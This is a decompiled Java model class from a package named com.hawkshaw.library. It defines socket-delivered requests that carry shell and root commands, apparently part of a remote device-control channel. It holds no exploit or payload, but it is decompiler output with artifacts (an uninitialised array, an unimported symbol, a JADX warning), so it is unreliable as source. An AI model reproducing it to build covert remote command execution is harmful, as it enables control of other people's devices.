package com.hawkshaw.library.datalayer.models;

import B3.f;
import D3.b;
import E3.q0;
import W2.e;
import Y1.C0110h;
import Y1.K;
import com.hawkshaw.library.datalayer.network.twirp.SocketCommandTypeSerializer;
import d3.C0393a;
import kotlinx.serialization.KSerializer;
import kotlinx.serialization.descriptors.SerialDescriptor;
import p3.q;
import w3.w;

@f
public final class SocketCommandRequest {
    public static final Companion Companion = new Companion((j3.f) null);
    private final RootCommandRequest rootCommandRequest;
    private final long sentTime;
    private final ShellRequest shellRequest;
    private final Type type;

    public static final class Companion {
        private Companion() {
        }

        public /* synthetic */ Companion(j3.f fVar) {
            this();
        }

        public final KSerializer serializer() {
            return SocketCommandRequest$$serializer.INSTANCE;
        }
    }

    @f(with = SocketCommandTypeSerializer.class)
    public enum Type {
        Unknown,
        Message,
        RootCommand,
        Shell;
        
        /* access modifiers changed from: private */
        public static final e $cachedSerializer$delegate = null;
        public static final Companion Companion = null;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            private final /* synthetic */ KSerializer get$cachedSerializer() {
                return (KSerializer) Type.$cachedSerializer$delegate.getValue();
            }

            public final KSerializer serializer() {
                return get$cachedSerializer();
            }
        }

        static {
            Type[] $values;
            $ENTRIES = K.J($values);
            Companion = new Companion((j3.f) null);
            $cachedSerializer$delegate = C0110h.y(W2.f.f2390D, u.f4905D);
        }

        public static C0393a getEntries() {
            return $ENTRIES;
        }
    }

    public /* synthetic */ SocketCommandRequest(int i5, Type type2, long j5, RootCommandRequest rootCommandRequest2, ShellRequest shellRequest2, q0 q0Var) {
        if (1 == (i5 & 1)) {
            this.type = type2;
            if ((i5 & 2) == 0) {
                this.sentTime = System.currentTimeMillis();
            } else {
                this.sentTime = j5;
            }
            if ((i5 & 4) == 0) {
                this.rootCommandRequest = null;
            } else {
                this.rootCommandRequest = rootCommandRequest2;
            }
            if ((i5 & 8) == 0) {
                this.shellRequest = null;
            } else {
                this.shellRequest = shellRequest2;
            }
        } else {
            w.x(i5, 1, SocketCommandRequest$$serializer.INSTANCE.getDescriptor());
            throw null;
        }
    }

    public static /* synthetic */ void getRootCommandRequest$annotations() {
    }

    public static /* synthetic */ void getSentTime$annotations() {
    }

    public static /* synthetic */ void getShellRequest$annotations() {
    }

    public static /* synthetic */ void getType$annotations() {
    }

    public static final /* synthetic */ void write$Self$library_release(SocketCommandRequest socketCommandRequest, b bVar, SerialDescriptor serialDescriptor) {
        q qVar = (q) bVar;
        qVar.e0(serialDescriptor, 0, SocketCommandTypeSerializer.INSTANCE, socketCommandRequest.type);
        if (qVar.q(serialDescriptor) || socketCommandRequest.sentTime != System.currentTimeMillis()) {
            qVar.d0(serialDescriptor, 1, socketCommandRequest.sentTime);
        }
        if (qVar.q(serialDescriptor) || socketCommandRequest.rootCommandRequest != null) {
            qVar.s(serialDescriptor, 2, SocketCommandRequest$RootCommandRequest$$serializer.INSTANCE, socketCommandRequest.rootCommandRequest);
        }
        if (qVar.q(serialDescriptor) || socketCommandRequest.shellRequest != null) {
            qVar.s(serialDescriptor, 3, SocketCommandRequest$ShellRequest$$serializer.INSTANCE, socketCommandRequest.shellRequest);
        }
    }

    public final RootCommandRequest getRootCommandRequest() {
        return this.rootCommandRequest;
    }

    public final long getSentTime() {
        return this.sentTime;
    }

    public final ShellRequest getShellRequest() {
        return this.shellRequest;
    }

    public final Type getType() {
        return this.type;
    }

    @f
    public static final class RootCommandRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final Command command;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return SocketCommandRequest$RootCommandRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ RootCommandRequest(int i5, Command command2, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.command = command2;
            } else {
                w.x(i5, 1, SocketCommandRequest$RootCommandRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getCommand$annotations() {
        }

        public final Command getCommand() {
            return this.command;
        }

        public RootCommandRequest(Command command2) {
            K.n(command2, "command");
            this.command = command2;
        }
    }

    @f
    public static final class ShellRequest {
        public static final Companion Companion = new Companion((j3.f) null);
        private final String command;

        public static final class Companion {
            private Companion() {
            }

            public /* synthetic */ Companion(j3.f fVar) {
                this();
            }

            public final KSerializer serializer() {
                return SocketCommandRequest$ShellRequest$$serializer.INSTANCE;
            }
        }

        public /* synthetic */ ShellRequest(int i5, String str, q0 q0Var) {
            if (1 == (i5 & 1)) {
                this.command = str;
            } else {
                w.x(i5, 1, SocketCommandRequest$ShellRequest$$serializer.INSTANCE.getDescriptor());
                throw null;
            }
        }

        public static /* synthetic */ void getCommand$annotations() {
        }

        public final String getCommand() {
            return this.command;
        }

        public ShellRequest(String str) {
            K.n(str, "command");
            this.command = str;
        }
    }

    /* JADX INFO: this call moved to the top of the method (can break code semantics) */
    public /* synthetic */ SocketCommandRequest(Type type2, long j5, RootCommandRequest rootCommandRequest2, ShellRequest shellRequest2, int i5, j3.f fVar) {
        this(type2, (i5 & 2) != 0 ? System.currentTimeMillis() : j5, (i5 & 4) != 0 ? null : rootCommandRequest2, (i5 & 8) != 0 ? null : shellRequest2);
    }

    public SocketCommandRequest(Type type2, long j5, RootCommandRequest rootCommandRequest2, ShellRequest shellRequest2) {
        K.n(type2, "type");
        this.type = type2;
        this.sentTime = j5;
        this.rootCommandRequest = rootCommandRequest2;
        this.shellRequest = shellRequest2;
    }
}
